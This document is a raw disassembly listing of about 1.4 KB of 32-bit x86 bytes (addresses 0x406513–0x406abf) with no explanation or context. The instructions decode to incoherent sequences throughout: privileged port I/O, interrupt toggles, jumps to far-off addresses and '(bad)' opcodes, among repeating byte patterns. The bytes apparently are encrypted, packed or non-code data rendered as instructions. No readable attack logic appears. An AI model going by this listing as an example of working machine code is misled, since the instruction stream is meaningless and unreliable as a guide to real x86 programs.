  406513:	60                   	pusha
  406514:	a0 b5 2b 4c f1       	mov    0xf14c2bb5,%al
  406519:	b3 2b                	mov    $0x2b,%bl
  40651b:	38 d3                	cmp    %dl,%bl
  40651d:	32 f5                	xor    %ch,%dh
  40651f:	c8 6e b0 e0          	enter  $0xb06e,$0xe0
  406523:	60                   	pusha
  406524:	04 5f                	add    $0x5f,%al
  406526:	d2 c4                	rol    %cl,%ah
  406528:	29 82 2b 23 88 20    	sub    %eax,0x2088232b(%edx)
  40652e:	77 5f                	ja     0x40658f
  406530:	9f                   	lahf
  406531:	b0 88                	mov    $0x88,%al
  406533:	4a                   	dec    %edx
  406534:	83 5f 9f e3          	sbbl   $0xffffffe3,-0x61(%edi)
  406538:	98                   	cwtl
  406539:	5f                   	pop    %edi
  40653a:	14 64                	adc    $0x64,%al
  40653c:	48                   	dec    %eax
  40653d:	70 14                	jo     0x406553
  40653f:	64 d3 20             	shll   %cl,%fs:(%eax)
  406542:	8b 62 50             	mov    0x50(%edx),%esp
  406545:	61                   	popa
  406546:	28 a5 9f 93 60 ba    	sub    %ah,-0x459f6c61(%ebp)
  40654c:	f9                   	stc
  40654d:	b9 04 e9 b0 c8       	mov    $0xc8b0e904,%ecx
  406552:	75 b0                	jne    0x406504
  406554:	e0 60                	loopne 0x4065b6
  406556:	63 49 01             	arpl   %ecx,0x1(%ecx)
  406559:	2f                   	das
  40655a:	9f                   	lahf
  40655b:	5f                   	pop    %edi
  40655c:	8b 58 2a             	mov    0x2a(%eax),%ebx
  40655f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406560:	9f                   	lahf
  406561:	bb f9 bd 63 b3       	mov    $0xb363bdf9,%ebx
  406566:	2b 38                	sub    (%eax),%edi
  406568:	2b 23                	sub    (%ebx),%esp
  40656a:	88 e2                	mov    %ah,%dl
  40656c:	77 5f                	ja     0x4065cd
  40656e:	9f                   	lahf
  40656f:	b0 88                	mov    $0x88,%al
  406571:	0c 83                	or     $0x83,%al
  406573:	5f                   	pop    %edi
  406574:	9f                   	lahf
  406575:	e3 98                	jecxz  0x40650f
  406577:	5f                   	pop    %edi
  406578:	14 64                	adc    $0x64,%al
  40657a:	48                   	dec    %eax
  40657b:	70 15                	jo     0x406592
  40657d:	64 d3 20             	shll   %cl,%fs:(%eax)
  406580:	fb                   	sti
  406581:	23 50 61             	and    0x61(%eax),%edx
  406584:	fb                   	sti
  406585:	23 2d a0 a0 b5 2b    	and    0x2bb5a0a0,%ebp
  40658b:	4c                   	dec    %esp
  40658c:	f1                   	int1
  40658d:	b3 f6                	mov    $0xf6,%bl
  40658f:	b7 2b                	mov    $0x2b,%bh
  406591:	38 66 a5             	cmp    %ah,-0x5b(%esi)
  406594:	9f                   	lahf
  406595:	60                   	pusha
  406596:	d3 20                	shll   %cl,(%eax)
  406598:	f5                   	cmc
  406599:	c8 db b1 e0          	enter  $0xb1db,$0xe0
  40659d:	60                   	pusha
  40659e:	04 5f                	add    $0x5f,%al
  4065a0:	d0 c4                	rol    $1,%ah
  4065a2:	29 80 2b 23 88 a6    	sub    %eax,-0x5977dcd5(%eax)
  4065a8:	77 5f                	ja     0x406609
  4065aa:	9f                   	lahf
  4065ab:	b0 88                	mov    $0x88,%al
  4065ad:	80 83 5f 9f e3 98 61 	addb   $0x61,-0x671c60a1(%ebx)
  4065b4:	bb 20 e0 e8 e5       	mov    $0xe5e8e020,%ebx
  4065b9:	5f                   	pop    %edi
  4065ba:	d3 20                	shll   %cl,(%eax)
  4065bc:	fa                   	cli
  4065bd:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4065c2:	8b 6a 89             	mov    -0x77(%edx),%ebp
  4065c5:	28 6d 5f             	sub    %ch,0x5f(%ebp)
  4065c8:	9f                   	lahf
  4065c9:	48                   	dec    %eax
  4065ca:	1b 2f                	sbb    (%edi),%ebp
  4065cc:	9f                   	lahf
  4065cd:	5f                   	pop    %edi
  4065ce:	2a a5 9f bf fe bb    	sub    -0x44014061(%ebp),%ah
  4065d4:	f9                   	stc
  4065d5:	bd 63 eb 60 b5       	mov    $0xb560eb63,%ebp
  4065da:	2b 4c f1 b3          	sub    -0x4d(%ecx,%esi,8),%ecx
  4065de:	f6 b7 66 a5 9f 60    	divb   0x609fa566(%edi)
  4065e4:	d3 32                	shll   %cl,(%edx)
  4065e6:	f5                   	cmc
  4065e7:	c8 23 b1 e0          	enter  $0xb123,$0xe0
  4065eb:	60                   	pusha
  4065ec:	04 5f                	add    $0x5f,%al
  4065ee:	d2 c4                	rol    %cl,%ah
  4065f0:	29 82 88 46 63 5f    	sub    %eax,0x5f634688(%edx)
  4065f6:	9f                   	lahf
  4065f7:	48                   	dec    %eax
  4065f8:	ed                   	in     (%dx),%eax
  4065f9:	21 9f 5f 25 20 af    	and    %ebx,-0x50dfdaa1(%edi)
  4065ff:	f4                   	hlt
  406600:	e5 5f                	in     $0x5f,%eax
  406602:	d3 20                	shll   %cl,(%eax)
  406604:	fa                   	cli
  406605:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  40660a:	8b 6a 89             	mov    -0x77(%edx),%ebp
  40660d:	e0 6d                	loopne 0x40667c
  40660f:	5f                   	pop    %edi
  406610:	9f                   	lahf
  406611:	48                   	dec    %eax
  406612:	d3 2f                	shrl   %cl,(%edi)
  406614:	9f                   	lahf
  406615:	5f                   	pop    %edi
  406616:	2a a5 9f bf fe bb    	sub    -0x44014061(%ebp),%ah
  40661c:	f9                   	stc
  40661d:	bd 63 eb 60 b3       	mov    $0xb360eb63,%ebp
  406622:	f6 eb                	imul   %bl
  406624:	92                   	xchg   %eax,%edx
  406625:	eb 78                	jmp    0x40669f
  406627:	eb 63                	jmp    0x40668c
  406629:	48                   	dec    %eax
  40662a:	6b 34 9f 5f          	imul   $0x5f,(%edi,%ebx,4),%esi
  40662e:	20 dc                	and    %bl,%ah
  406630:	a3 5f fc d4 b1       	mov    %eax,0xb1d4fc5f
  406635:	eb 66                	jmp    0x40669d
  406637:	19 74 b1 e0          	sbb    %esi,-0x20(%ecx,%esi,4)
  40663b:	60                   	pusha
  40663c:	2b 33                	sub    (%ebx),%esi
  40663e:	88 62 75             	mov    %ah,0x75(%edx)
  406641:	5f                   	pop    %edi
  406642:	9f                   	lahf
  406643:	be fb 23 2b 26       	mov    $0x262b23fb,%esi
  406648:	2b 33                	sub    (%ebx),%esi
  40664a:	88 de                	mov    %bl,%dh
  40664c:	73 5f                	jae    0x4066ad
  40664e:	9f                   	lahf
  40664f:	be fb 23 a0 60       	mov    $0x60a023fb,%esi
  406654:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  406659:	61                   	popa
  40665a:	a0 60 a0 bc a0       	mov    0xa0bca060,%al
  40665f:	60                   	pusha
  406660:	a0 b5 2b 4c 23       	mov    0x234c2bb5,%al
  406665:	24 40                	and    $0x40,%al
  406667:	b3 f6                	mov    $0xf6,%bl
  406669:	b7 28                	mov    $0x28,%bh
  40666b:	ad                   	lods   %ds:(%esi),%eax
  40666c:	9f                   	lahf
  40666d:	eb 7a                	jmp    0x4066e9
  40666f:	eb 90                	jmp    0x406601
  406671:	93                   	xchg   %eax,%ebx
  406672:	60                   	pusha
  406673:	e9 e5 58 d3 32       	jmp    0x3313bf5d
  406678:	f5                   	cmc
  406679:	c8 81 b2 e0          	enter  $0xb281,$0xe0
  40667d:	60                   	pusha
  40667e:	04 5f                	add    $0x5f,%al
  406680:	d2 c4                	rol    %cl,%ah
  406682:	29 82 2d a5 50 93    	sub    %eax,-0x6caf5ad3(%edx)
  406688:	69 1a e4 60 a0 60    	imul   $0x60a060e4,(%edx),%ebx
  40668e:	88 52 67             	mov    %dl,0x67(%edx)
  406691:	5f                   	pop    %edi
  406692:	9f                   	lahf
  406693:	ed                   	in     (%dx),%eax
  406694:	e5 00                	in     $0x0,%eax
  406696:	d3 29                	shrl   %cl,(%ecx)
  406698:	5a                   	pop    %edx
  406699:	70 a0                	jo     0x40663b
  40669b:	60                   	pusha
  40669c:	a0 48 83 27 9f       	mov    0x9f278348,%al
  4066a1:	5f                   	pop    %edi
  4066a2:	67 a5                	movsl  %ds:(%si),%es:(%di)
  4066a4:	50                   	push   %eax
  4066a5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4066a6:	a0 60 a0 e0 1d       	mov    0x1de0a060,%al
  4066ab:	6c                   	insb   (%dx),%es:(%edi)
  4066ac:	a0 d4 ad 27 e5       	mov    0xe527add4,%al
  4066b1:	3c a1                	cmp    $0xa1,%al
  4066b3:	60                   	pusha
  4066b4:	a0 60 06 27 e5       	mov    0xe5270660,%al
  4066b9:	40                   	inc    %eax
  4066ba:	a0 60 24 3b 14       	mov    0x143b2460,%al
  4066bf:	8b 2d a5 40 b0 2d    	mov    0x2db040a5,%ebp
  4066c5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4066c6:	50                   	push   %eax
  4066c7:	b0 0a                	mov    $0xa,%al
  4066c9:	60                   	pusha
  4066ca:	0a 60 0a             	or     0xa(%eax),%ah
  4066cd:	64 0a 60 0a          	or     %fs:0xa(%eax),%ah
  4066d1:	60                   	pusha
  4066d2:	0a 60 2b             	or     0x2b(%eax),%ah
  4066d5:	26 88 76 76          	mov    %dh,%es:0x76(%esi)
  4066d9:	5f                   	pop    %edi
  4066da:	9f                   	lahf
  4066db:	b0 0a                	mov    $0xa,%al
  4066dd:	60                   	pusha
  4066de:	88 46 81             	mov    %al,-0x7f(%esi)
  4066e1:	5f                   	pop    %edi
  4066e2:	9f                   	lahf
  4066e3:	e3 98                	jecxz  0x40667d
  4066e5:	61                   	popa
  4066e6:	bb 20 e0 4b c9       	mov    $0xc94be020,%ebx
  4066eb:	ed                   	in     (%dx),%eax
  4066ec:	e5 00                	in     $0x0,%eax
  4066ee:	f0 ed                	lock in (%dx),%eax
  4066f0:	e5 10                	in     $0x10,%eax
  4066f2:	f0 ca a0 ca          	lock lret $0xcaa0
  4066f6:	a0 ca c0 ca a0       	mov    0xa0cac0ca,%al
  4066fb:	ca a0 ca             	lret   $0xcaa0
  4066fe:	a0 eb 66 48 8b       	mov    0x8b4866eb,%al
  406703:	35 9f 5f f0 ca       	xor    $0xcaf05f9f,%eax
  406708:	a0 48 5b 41 9f       	mov    0x9f415b48,%al
  40670d:	5f                   	pop    %edi
  40670e:	23 58 a1             	and    -0x5f(%eax),%ebx
  406711:	7b 60                	jnp    0x406773
  406713:	a0 24 20 14 96       	mov    0x96142024,%al
  406718:	20 dd                	and    %bl,%ch
  40671a:	9f                   	lahf
  40671b:	60                   	pusha
  40671c:	14 6b                	adc    $0x6b,%al
  40671e:	0a 5f 2b             	or     0x2b(%edi),%bl
  406721:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406722:	40                   	inc    %eax
  406723:	b0 88                	mov    $0x88,%al
  406725:	a0 82 5f 9f e3       	mov    0xe39f5f82,%al
  40672a:	1d 68 a0 d4 b9       	sbb    $0xb9d4a068,%eax
  40672f:	ed                   	in     (%dx),%eax
  406730:	e5 54                	in     $0x54,%eax
  406732:	f0 eb e5             	lock jmp 0x40671a
  406735:	00 f0                	add    %dh,%al
  406737:	48                   	dec    %eax
  406738:	7d 41                	jge    0x40677b
  40673a:	9f                   	lahf
  40673b:	5f                   	pop    %edi
  40673c:	25 20 14 68 2b       	and    $0x2b681420,%eax
  406741:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406742:	a8 eb                	test   $0xeb,%al
  406744:	f5                   	cmc
  406745:	54                   	push   %esp
  406746:	29 70 2b             	sub    %esi,0x2b(%eax)
  406749:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40674a:	48                   	dec    %eax
  40674b:	e9 e5 58 2b a5       	jmp    0xa56bc035
  406750:	40                   	inc    %eax
  406751:	b0 88                	mov    $0x88,%al
  406753:	a2 81 5f 9f eb       	mov    %al,0xeb9f5f81
  406758:	e5 04                	in     $0x4,%eax
  40675a:	f0 48                	lock dec %eax
  40675c:	d9 41 9f             	flds   -0x61(%ecx)
  40675f:	5f                   	pop    %edi
  406760:	d3 20                	shll   %cl,(%eax)
  406762:	fa                   	cli
  406763:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406768:	8b 6a 89             	mov    -0x77(%edx),%ebp
  40676b:	82 6c 5f 9f 48       	subb   $0x48,-0x61(%edi,%ebx,2)
  406770:	75 2d                	jne    0x40679f
  406772:	9f                   	lahf
  406773:	5f                   	pop    %edi
  406774:	2b a5 98 bf fe bb    	sub    -0x44014068(%ebp),%esp
  40677a:	2b 45 fd             	sub    -0x3(%ebp),%eax
  40677d:	22 a8 60 30 b3 23    	and    0x23b33060(%eax),%ch
  406783:	24 98                	and    $0x98,%al
  406785:	eb 78                	jmp    0x4067ff
  406787:	4b                   	dec    %ebx
  406788:	b8 ed e3 78 f0       	mov    $0xf078e3ed,%eax
  40678d:	eb e3                	jmp    0x406772
  40678f:	74 f0                	je     0x406781
  406791:	48                   	dec    %eax
  406792:	03 41 9f             	add    -0x61(%ecx),%eax
  406795:	5f                   	pop    %edi
  406796:	25 20 15 67 88       	and    $0x88671520,%eax
  40679b:	ea 81 5f 9f 4b df eb 	ljmp   $0xebdf,$0x4b9f5f81
  4067a2:	e3 78                	jecxz  0x40681c
  4067a4:	c3                   	ret
  4067a5:	a3 b0 d5 80 b4       	mov    %eax,0xb480d5b0
  4067aa:	2d a3 cc b0 88       	sub    $0x88b0cca3,%eax
  4067af:	8e 81 5f 9f b3 2d    	mov    0x2db39f5f(%ecx),%es
  4067b5:	a3 a2 b0 2d a4       	mov    %eax,0xa42db0a2
  4067ba:	c4 68 f0             	les    -0x10(%eax),%ebp
  4067bd:	48                   	dec    %eax
  4067be:	b7 41                	mov    $0x41,%bh
  4067c0:	9f                   	lahf
  4067c1:	5f                   	pop    %edi
  4067c2:	2b a3 d8 e9 e3 64    	sub    0x64e3e9d8(%ebx),%esp
  4067c8:	2b a3 b8 e9 e3 68    	sub    0x68e3e9b8(%ebx),%esp
  4067ce:	2d a3 ac ed f3       	sub    $0xf3edaca3,%eax
  4067d3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4067d4:	59                   	pop    %ecx
  4067d5:	64 a1 60 a0 48 a3    	mov    %fs:0xa348a060,%eax
  4067db:	33 9f 5f d3 20 f9    	xor    -0x6df2ca1(%edi),%ebx
  4067e1:	ba fb 23 30 b3       	mov    $0xb33023fb,%edx
  4067e6:	2b 38                	sub    (%eax),%edi
  4067e8:	2b a3 b4 e3 98 5f    	sub    0x5f98e3b4(%ebx),%esp
  4067ee:	14 6d                	adc    $0x6d,%al
  4067f0:	f0 48                	lock dec %eax
  4067f2:	93                   	xchg   %eax,%ebx
  4067f3:	40                   	inc    %eax
  4067f4:	9f                   	lahf
  4067f5:	5f                   	pop    %edi
  4067f6:	67 a3 b4 5f          	addr16 mov %eax,0x5fb4
  4067fa:	9f                   	lahf
  4067fb:	5f                   	pop    %edi
  4067fc:	9f                   	lahf
  4067fd:	bb 63 eb 60 b3       	mov    $0xb360eb63,%ebx
  406802:	f6 b7 2b 39 2b 58    	divb   0x582b392b(%edi)
  406808:	97                   	xchg   %eax,%edi
  406809:	32 23                	xor    (%ebx),%ah
  40680b:	42                   	inc    %edx
  40680c:	be e9 f3 70 2d       	mov    $0x2d70f3e9,%esi
  406811:	a3 b8 b0 2b 27       	mov    %eax,0x272bb0b8
  406816:	88 36                	mov    %dh,(%esi)
  406818:	74 5f                	je     0x406879
  40681a:	9f                   	lahf
  40681b:	b0 88                	mov    $0x88,%al
  40681d:	30 80 5f 9f eb 90    	xor    %al,-0x6f1460a1(%eax)
  406823:	e9 13 74 23 5e       	jmp    0x5e63dc3b
  406828:	9f                   	lahf
  406829:	d4 b6                	aam    $0xb6
  40682b:	eb 63                	jmp    0x406890
  40682d:	48                   	dec    %eax
  40682e:	ef                   	out    %eax,(%dx)
  40682f:	5f                   	pop    %edi
  406830:	9f                   	lahf
  406831:	5f                   	pop    %edi
  406832:	2b 50 25             	sub    0x25(%eax),%edx
  406835:	56                   	push   %esi
  406836:	14 70                	adc    $0x70,%al
  406838:	2b 23                	sub    (%ebx),%esp
  40683a:	88 06                	mov    %al,(%esi)
  40683c:	9f                   	lahf
  40683d:	5f                   	pop    %edi
  40683e:	9f                   	lahf
  40683f:	4b                   	dec    %ebx
  406840:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406841:	48                   	dec    %eax
  406842:	83 40 9f 5f          	addl   $0x5f,-0x61(%eax)
  406846:	2b 50 2b             	sub    0x2b(%eax),%edx
  406849:	26 ff                	es (bad)
  40684b:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  406850:	a0 b3 2b 38 2d       	mov    0x2d382bb3,%al
  406855:	a3 b8 b0 2b a3       	mov    %eax,0xa32bb0b8
  40685a:	b4 b0                	mov    $0xb0,%ah
  40685c:	88 f8                	mov    %bh,%al
  40685e:	80 5f 9f e5          	sbbb   $0xe5,-0x61(%edi)
  406862:	60                   	pusha
  406863:	d4 a9                	aam    $0xa9
  406865:	eb 63                	jmp    0x4068ca
  406867:	48                   	dec    %eax
  406868:	b5 5f                	mov    $0x5f,%ch
  40686a:	9f                   	lahf
  40686b:	5f                   	pop    %edi
  40686c:	fb                   	sti
  40686d:	23 88 16 80 5f 9f    	and    -0x60a07fea(%eax),%ecx
  406873:	bb 63 b5 2b 4c       	mov    $0x4c2bb563,%ebx
  406878:	f1                   	int1
  406879:	19 d2                	sbb    %edx,%edx
  40687b:	60                   	pusha
  40687c:	a0 60 0a 60 0a       	mov    0xa600a60,%al
  406881:	60                   	pusha
  406882:	e9 d5 99 b1 27       	jmp    0x27f2025c
  406887:	ad                   	lods   %ds:(%esi),%eax
  406888:	9c                   	pushf
  406889:	b3 f6                	mov    $0xf6,%bl
  40688b:	b7 29                	mov    $0x29,%bh
  40688d:	ad                   	lods   %ds:(%esi),%eax
  40688e:	98                   	cwtl
  40688f:	e9 f5 5c 2b 50       	jmp    0x506bc589
  406894:	2b bd ac ed 25 f4    	sub    -0xbda1254(%ebp),%edi
  40689a:	9e                   	sahf
  40689b:	5f                   	pop    %edi
  40689c:	9f                   	lahf
  40689d:	eb b5                	jmp    0x406854
  40689f:	5c                   	pop    %esp
  4068a0:	ee                   	out    %al,(%dx)
  4068a1:	a0 a0 48 bd 36       	mov    0x36bd48a0,%al
  4068a6:	9f                   	lahf
  4068a7:	5f                   	pop    %edi
  4068a8:	d3 20                	shll   %cl,(%eax)
  4068aa:	f5                   	cmc
  4068ab:	c8 92 b6 e0          	enter  $0xb692,$0xe0
  4068af:	60                   	pusha
  4068b0:	04 5f                	add    $0x5f,%al
  4068b2:	d0 c4                	rol    $1,%ah
  4068b4:	29 80 52 61 41 a4    	sub    %eax,-0x5bbe9eae(%eax)
  4068ba:	d5 a0                	aad    $0xa0
  4068bc:	a0 48 13 41 9f       	mov    0x9f411348,%al
  4068c1:	5f                   	pop    %edi
  4068c2:	29 a5 90 12 a1 01    	sub    %esp,0x1a11290(%ebp)
  4068c8:	e4 95                	in     $0x95,%al
  4068ca:	e0 60                	loopne 0x40692c
  4068cc:	88 c4                	mov    %al,%ah
  4068ce:	81 5f 9f e9 e5 54 d3 	sbbl   $0xd354e5e9,-0x61(%edi)
  4068d5:	32 f5                	xor    %ch,%dh
  4068d7:	c8 54 b6 e0          	enter  $0xb654,$0xe0
  4068db:	60                   	pusha
  4068dc:	04 5f                	add    $0x5f,%al
  4068de:	d2 c4                	rol    %cl,%ah
  4068e0:	29 82 40 64 f7 a0    	sub    %eax,-0x5f089bc0(%edx)
  4068e6:	a0 b0 2d e5 30       	mov    0x30e52db0,%al
  4068eb:	5e                   	pop    %esi
  4068ec:	9f                   	lahf
  4068ed:	5f                   	pop    %edi
  4068ee:	f0 19 b0 b7 e0 60 5a 	lock sbb %esi,0x5a60e0b7(%eax)
  4068f5:	7c f7                	jl     0x4068ee
  4068f7:	a0 a0 eb e5 58       	mov    0x58e5eba0,%al
  4068fc:	88 f0                	mov    %dh,%al
  4068fe:	87 5f 9f             	xchg   %ebx,-0x61(%edi)
  406901:	eb 35                	jmp    0x406938
  406903:	f0 9e                	lock sahf
  406905:	5f                   	pop    %edi
  406906:	9f                   	lahf
  406907:	eb e5                	jmp    0x4068ee
  406909:	50                   	push   %eax
  40690a:	88 6a 82             	mov    %ch,-0x7e(%edx)
  40690d:	5f                   	pop    %edi
  40690e:	9f                   	lahf
  40690f:	ed                   	in     (%dx),%eax
  406910:	f5                   	cmc
  406911:	4c                   	dec    %esp
  406912:	2b 26                	sub    (%esi),%esp
  406914:	88 68 9d             	mov    %ch,-0x63(%eax)
  406917:	5f                   	pop    %edi
  406918:	9f                   	lahf
  406919:	ed                   	in     (%dx),%eax
  40691a:	25 ec 9e 5f 9f       	and    $0x9f5f9eec,%eax
  40691f:	eb ed                	jmp    0x40690e
  406921:	5c                   	pop    %esp
  406922:	2b b5 8c 48 bb 32    	sub    0x32bb488c(%ebp),%esi
  406928:	9f                   	lahf
  406929:	5f                   	pop    %edi
  40692a:	2b e5                	sub    %ebp,%esp
  40692c:	2c 5e                	sub    $0x5e,%al
  40692e:	9f                   	lahf
  40692f:	5f                   	pop    %edi
  406930:	2d ed 34 5e 9f       	sub    $0x9f5e34ed,%eax
  406935:	5f                   	pop    %edi
  406936:	5a                   	pop    %edx
  406937:	8f                   	(bad)
  406938:	a0 60 a0 48 61       	mov    0x6148a060,%al
  40693d:	5e                   	pop    %esi
  40693e:	9f                   	lahf
  40693f:	5f                   	pop    %edi
  406940:	25 20 af f4 60       	and    $0x60f4af20,%eax
  406945:	4b                   	dec    %ebx
  406946:	d4 ed                	aam    $0xed
  406948:	25 e8 9e 5f 9f       	and    $0x9f5f9ee8,%eax
  40694d:	eb 2d                	jmp    0x40697c
  40694f:	00 9e 5f 9f eb f5    	add    %bl,-0xa1460a1(%esi)
  406955:	4c                   	dec    %esp
  406956:	88 4a 71             	mov    %cl,0x71(%edx)
  406959:	5f                   	pop    %edi
  40695a:	9f                   	lahf
  40695b:	eb 35                	jmp    0x406992
  40695d:	e8 9e 5f 9f eb       	call   0xebdfc900
  406962:	e5 68                	in     $0x68,%eax
  406964:	2b 60 88             	sub    -0x78(%eax),%esp
  406967:	b6 83                	mov    $0x83,%dh
  406969:	5f                   	pop    %edi
  40696a:	9f                   	lahf
  40696b:	ed                   	in     (%dx),%eax
  40696c:	25 f4 9e 5f 9f       	and    $0x9f5f9ef4,%eax
  406971:	48                   	dec    %eax
  406972:	7b 5e                	jnp    0x4069d2
  406974:	9f                   	lahf
  406975:	5f                   	pop    %edi
  406976:	25 20 af f4 60       	and    $0x60f4af20,%eax
  40697b:	e4 60                	in     $0x60,%al
  40697d:	d5 68                	aad    $0x68
  40697f:	ed                   	in     (%dx),%eax
  406980:	25 f4 9e 5f 9f       	and    $0x9f5f9ef4,%eax
  406985:	48                   	dec    %eax
  406986:	fb                   	sti
  406987:	5e                   	pop    %esi
  406988:	9f                   	lahf
  406989:	5f                   	pop    %edi
  40698a:	24 3b                	and    $0x3b,%al
  40698c:	15 6a 88 46 6b       	adc    $0x6b46886a,%eax
  406991:	5f                   	pop    %edi
  406992:	9f                   	lahf
  406993:	49                   	dec    %ecx
  406994:	4c                   	dec    %esp
  406995:	61                   	popa
  406996:	a0 60 2d ed 20       	mov    0x20ed2d60,%al
  40699b:	5e                   	pop    %esi
  40699c:	9f                   	lahf
  40699d:	5f                   	pop    %edi
  40699e:	d3 32                	shll   %cl,(%edx)
  4069a0:	58                   	pop    %eax
  4069a1:	88 f7                	mov    %dh,%bh
  4069a3:	a0 a0 48 fb 52       	mov    0x52fb48a0,%al
  4069a8:	9f                   	lahf
  4069a9:	5f                   	pop    %edi
  4069aa:	2b ed                	sub    %ebp,%ebp
  4069ac:	20 5e 9f             	and    %bl,-0x61(%esi)
  4069af:	5f                   	pop    %edi
  4069b0:	2d e5 24 5e 9f       	sub    $0x9f5e24e5,%eax
  4069b5:	5f                   	pop    %edi
  4069b6:	2b b5 8c 48 27 31    	sub    0x3127488c(%ebp),%esi
  4069bc:	9f                   	lahf
  4069bd:	5f                   	pop    %edi
  4069be:	2b e5                	sub    %ebp,%esp
  4069c0:	24 5e                	and    $0x5e,%al
  4069c2:	9f                   	lahf
  4069c3:	5f                   	pop    %edi
  4069c4:	2d ed 34 5e 9f       	sub    $0x9f5e34ed,%eax
  4069c9:	5f                   	pop    %edi
  4069ca:	5a                   	pop    %edx
  4069cb:	9f                   	lahf
  4069cc:	a0 60 a0 48 cd       	mov    0xcd48a060,%al
  4069d1:	5e                   	pop    %esi
  4069d2:	9f                   	lahf
  4069d3:	5f                   	pop    %edi
  4069d4:	25 20 af f4 60       	and    $0x60f4af20,%eax
  4069d9:	49                   	dec    %ecx
  4069da:	92                   	xchg   %eax,%edx
  4069db:	60                   	pusha
  4069dc:	a0 60 96 e5 3c       	mov    0x3ce59660,%al
  4069e1:	5e                   	pop    %esi
  4069e2:	9f                   	lahf
  4069e3:	5f                   	pop    %edi
  4069e4:	b0 6f                	mov    $0x6f,%al
  4069e6:	24 35                	and    $0x35,%al
  4069e8:	a0 60 a0 eb 25       	mov    0x25eba060,%al
  4069ed:	00 9e 5f 9f e0 d8    	add    %bl,-0x271f60a1(%esi)
  4069f3:	8e af e4 66 60 a0    	mov    -0x5f9f991c(%edi),%gs
  4069f9:	60                   	pusha
  4069fa:	2b a5 90 48 6f 41    	sub    0x416f4890(%ebp),%esp
  406a00:	9f                   	lahf
  406a01:	5f                   	pop    %edi
  406a02:	25 20 af ee 34       	and    $0x34eeaf20,%eax
  406a07:	60                   	pusha
  406a08:	a0 60 2b a5 90       	mov    0x90a52b60,%al
  406a0d:	48                   	dec    %eax
  406a0e:	5f                   	pop    %edi
  406a0f:	41                   	inc    %ecx
  406a10:	9f                   	lahf
  406a11:	5f                   	pop    %edi
  406a12:	2b 58 ef             	sub    -0x11(%eax),%ebx
  406a15:	e5 9f                	in     $0x9f,%eax
  406a17:	6f                   	outsl  %ds:(%esi),(%dx)
  406a18:	2c 03                	sub    $0x3,%al
  406a1a:	a0 60 a0 a7 d3       	mov    0xd3a7a060,%al
  406a1f:	56                   	push   %esi
  406a20:	2d ed 18 5e 9f       	sub    $0x9f5e18ed,%eax
  406a25:	5f                   	pop    %edi
  406a26:	2b 36                	sub    (%esi),%esi
  406a28:	2b a5 90 48 91 42    	sub    0x42914890(%ebp),%esp
  406a2e:	9f                   	lahf
  406a2f:	5f                   	pop    %edi
  406a30:	2b e5                	sub    %ebp,%esp
  406a32:	18 5e 9f             	sbb    %bl,-0x61(%esi)
  406a35:	5f                   	pop    %edi
  406a36:	2d f5 1c 5e 9f       	sub    $0x9f5e1cf5,%eax
  406a3b:	5f                   	pop    %edi
  406a3c:	88 dc                	mov    %bl,%ah
  406a3e:	84 5f 9f             	test   %bl,-0x61(%edi)
  406a41:	eb 25                	jmp    0x406a68
  406a43:	dc 9e 5f 9f b0 2d    	fcompl 0x2db09f5f(%esi)
  406a49:	f5                   	cmc
  406a4a:	14 5e                	adc    $0x5e,%al
  406a4c:	9f                   	lahf
  406a4d:	5f                   	pop    %edi
  406a4e:	2b e5                	sub    %ebp,%esp
  406a50:	40                   	inc    %eax
  406a51:	5e                   	pop    %esi
  406a52:	9f                   	lahf
  406a53:	5f                   	pop    %edi
  406a54:	88 c4                	mov    %al,%ah
  406a56:	84 5f 9f             	test   %bl,-0x61(%edi)
  406a59:	eb 35                	jmp    0x406a90
  406a5b:	d4 9e                	aam    $0x9e
  406a5d:	5f                   	pop    %edi
  406a5e:	9f                   	lahf
  406a5f:	b8 88 d0 73 5f       	mov    $0x5f73d088,%eax
  406a64:	9f                   	lahf
  406a65:	e5 60                	in     $0x60,%eax
  406a67:	df f7                	fcomip %st(7),%st
  406a69:	eb e5                	jmp    0x406a50
  406a6b:	50                   	push   %eax
  406a6c:	88 c0                	mov    %al,%al
  406a6e:	81 5f 9f a8 db 50 15 	sbbl   $0x1550dba8,-0x61(%edi)
  406a75:	82 2d e5 10 5e 9f 5f 	subb   $0x5f,0x9f5e10e5
  406a7c:	2b ed                	sub    %ebp,%ebp
  406a7e:	40                   	inc    %eax
  406a7f:	5e                   	pop    %esi
  406a80:	9f                   	lahf
  406a81:	5f                   	pop    %edi
  406a82:	2b b5 8c 48 5b 30    	sub    0x305b488c(%ebp),%esi
  406a88:	9f                   	lahf
  406a89:	5f                   	pop    %edi
  406a8a:	2b f5                	sub    %ebp,%esi
  406a8c:	10 5e 9f             	adc    %bl,-0x61(%esi)
  406a8f:	5f                   	pop    %edi
  406a90:	2b a5 94 48 c9 42    	sub    0x42c94894(%ebp),%esp
  406a96:	9f                   	lahf
  406a97:	5f                   	pop    %edi
  406a98:	e6 af                	out    %al,$0xaf
  406a9a:	15 e4 8b 82 2d       	adc    $0x2d828be4,%eax
  406a9f:	e5 0c                	in     $0xc,%eax
  406aa1:	5e                   	pop    %esi
  406aa2:	9f                   	lahf
  406aa3:	5f                   	pop    %edi
  406aa4:	2b ed                	sub    %ebp,%ebp
  406aa6:	40                   	inc    %eax
  406aa7:	5e                   	pop    %esi
  406aa8:	9f                   	lahf
  406aa9:	5f                   	pop    %edi
  406aaa:	2b b5 8c 48 33 30    	sub    0x3033488c(%ebp),%esi
  406ab0:	9f                   	lahf
  406ab1:	5f                   	pop    %edi
  406ab2:	2b f5                	sub    %ebp,%esi
  406ab4:	0c 5e                	or     $0x5e,%al
  406ab6:	9f                   	lahf
  406ab7:	5f                   	pop    %edi
  406ab8:	2b a5 94 48 a1 42    	sub    0x42a14894(%ebp),%esp
  406abe:	9f                   	lahf
  406abf:	5f                   	pop    %edi
